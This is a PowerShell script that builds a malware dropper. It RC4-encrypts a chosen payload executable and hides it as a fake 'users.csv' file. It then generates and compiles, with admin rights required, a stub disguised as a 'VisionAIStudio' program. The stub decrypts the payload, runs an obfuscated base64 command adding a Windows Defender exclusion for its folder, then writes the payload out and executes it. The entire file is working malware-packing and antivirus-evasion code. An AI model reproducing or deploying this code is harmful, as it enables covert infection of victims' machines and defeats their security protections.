function Initialize-RC4State($key) {
    $S = 0..255
    $j = 0
    $keyLength = $key.Length

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $keyLength]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }

    return ,$S
}

function Generate-RC4Stream($S, $dataLength) {
    $i = $j = 0
    $stream = New-Object byte[] $dataLength

    for ($k = 0; $k -lt $dataLength; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
        $stream[$k] = $S[($S[$i] + $S[$j]) % 256]
    }

    return ,$stream
}

function RC4($key, $data) {
    $S = Initialize-RC4State $key
    $stream = Generate-RC4Stream $S $data.Length
    $result = New-Object byte[] $data.Length

    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor $stream[$i]
    }

    return ,$result
}

function Format-String {
    param (
        [string]$InputString
    )

    # Split the input string into chunks of 8 characters
    $chunks = [regex]::Matches($InputString, '.{1,8}').Value

    # Join the chunks with commas
    $commaSeparated = $chunks -join ','

    # Initialize variables for processing newlines after every 6 commas
    $commaCount = 0
    $outputString = ''
    foreach ($char in $commaSeparated.ToCharArray()) {
        $outputString += $char
        if ($char -eq ',') {
            $commaCount++
            if ($commaCount -eq 6) {
                $outputString += "`n" # Adds a newline character
                $commaCount = 0
            }
        }
    }

    return $outputString
}

function Get-RandomBytes {
    param(
        [Parameter(Mandatory=$true)]
        [int]$n
    )

    $randomBytes = New-Object byte[] $n
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($randomBytes)
    $rng.Dispose()
    
    return $randomBytes
}




$payloadFilepath = Read-Host "Enter the FULL file path of the payload file"

# C:\Users\oven\Documents\Projects\other\payload.exe
Write-Host "You entered: $payloadFilepath"

# Read payload into memory
$data = Get-Content -Path $payloadFilepath -Encoding Byte

# Pad with random bytes
$padBytes = Get-RandomBytes -n 64
$data = $padBytes + $data

# Generate the key
$key = [System.Text.Encoding]::UTF8.GetBytes("a")

# Encrypt the payload
$encryptedData = RC4 $key $data
# $decryptedData = RC4 $key $encryptedData # decryption code

# Convert the payload a base64 string
$encryptedDataBase64 = [Convert]::ToBase64String($encryptedData)
Write-Host "String Length: " $encryptedDataBase64.Length
$formattedString = Format-String -InputString $encryptedDataBase64

# Save the script to disk
$savePath = ".\users.csv"
Set-Content -Path $savePath -Value $formattedString
Write-Host "Encrypted binary saved to disk:" $savePath



$stubCode = @"

function Initialize-RC4State(`$key) {
    `$S = 0..255
    `$j = 0
    `$keyLength = `$key.Length

    for (`$i = 0; `$i -lt 256; `$i++) {
        `$j = (`$j + `$S[`$i] + `$key[`$i % `$keyLength]) % 256
        `$temp = `$S[`$i]
        `$S[`$i] = `$S[`$j]
        `$S[`$j] = `$temp
    }

    return ,`$S
}

function Generate-RC4Stream(`$S, `$dataLength) {
    `$i = `$j = 0
    `$stream = New-Object byte[] `$dataLength

    for (`$k = 0; `$k -lt `$dataLength; `$k++) {
        `$i = (`$i + 1) % 256
        `$j = (`$j + `$S[`$i]) % 256
        `$temp = `$S[`$i]
        `$S[`$i] = `$S[`$j]
        `$S[`$j] = `$temp
        `$stream[`$k] = `$S[(`$S[`$i] + `$S[`$j]) % 256]
    }

    return ,`$stream
}

function RC4(`$key, `$data) {
    `$S = Initialize-RC4State `$key
    `$stream = Generate-RC4Stream `$S `$data.Length
    `$result = New-Object byte[] `$data.Length

    for (`$i = 0; `$i -lt `$data.Length; `$i++) {
        `$result[`$i] = `$data[`$i] -bxor `$stream[`$i]
    }

    return ,`$result
}

function Reverse-FormatString {
    param (
        [string]`$FormattedString
    )

    `$cleanString = `$FormattedString -replace `"``n`", `"`" -replace `",`", `"`"

    return `$cleanString
}

# Get the current directory and create a path to where the payload program is stored
`$currentDirectory = Get-Location
`$filePathOfCSV = Join-Path -Path `$currentDirectory -ChildPath `"users.csv`"

# Read the payload from disk, get it out of CSV format, and convert to bytes
`$csvAsString = Get-Content -Path `$filePathOfCSV -Raw
`$originalString = Reverse-FormatString -FormattedString `$csvAsString
`$encryptedBytes = [Convert]::FromBase64String(`$originalString)

# Decrypt data
`$key = `"a`"
`$decryptedBytes = RC4 `$key `$encryptedBytes

# Remove first 64 bytes
`$decryptedBytes = `$decryptedBytes[64..(`$decryptedBytes.Length - 1)]

# Create a new folder called in Program Files
`$programFilesPath = [Environment]::GetFolderPath([Environment+SpecialFolder]::ProgramFiles)
`$execDir = `$programFilesPath + `"\VisionAIStudio`"
if (-Not (Test-Path -Path `$execDir)) {
    New-Item -Path `$execDir -ItemType Directory > `$null
}
Start-Sleep 2
# Mkae the folder from where he payload will be ran excluded from Windows Security
# Add-MpPreference -ExclusionPath ([Environment]::GetFolderPath([Environment+SpecialFolder]::ProgramFiles) + `"\VisionAIStudio`")
`$c = `"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBv`"
`$c += `"AG4AUABhAHQAaAAgACgAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoARwBlAHQ`"
`$c += `"ARgBvAGwAZABlAHIAUABhAHQAaAAoAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0ACsAUw`"
`$c += `"BwAGUAYwBpAGEAbABGAG8AbABkAGUAcgBdADoAOgBQAHIAbwBnAHIAYQBtAEYAaQBsA`"
`$c += `"GUAcwApACAAKwAgACIAXABWAGkAcwBpAG8AbgBBAEkAUwB0AHUAZABpAG8AIgApAA==`"
powershell.exe -EncodedCommand `$c
Start-Sleep 2

# Save payload to .config folder
`$execPath = `$execDir + `"\visai.exe`"
[System.IO.File]::WriteAllBytes(`$execPath, `$decryptedBytes)

# Run the payload
& `$execPath

# Keep the shell up (otherwise comment this out)
Read-Host -Prompt `"Press Enter to continue`"

"@

$savePath = ".\packed.ps1"
Set-Content -Path $savePath -Value $stubCode

Invoke-PS2EXE -inputFile $savePath -outputFile ".\vision.exe" -requireAdmin

Remove-Item -Path $savePath


# Keep the shell up (otherwise comment this out)
Read-Host -Prompt "Press Enter to exit program"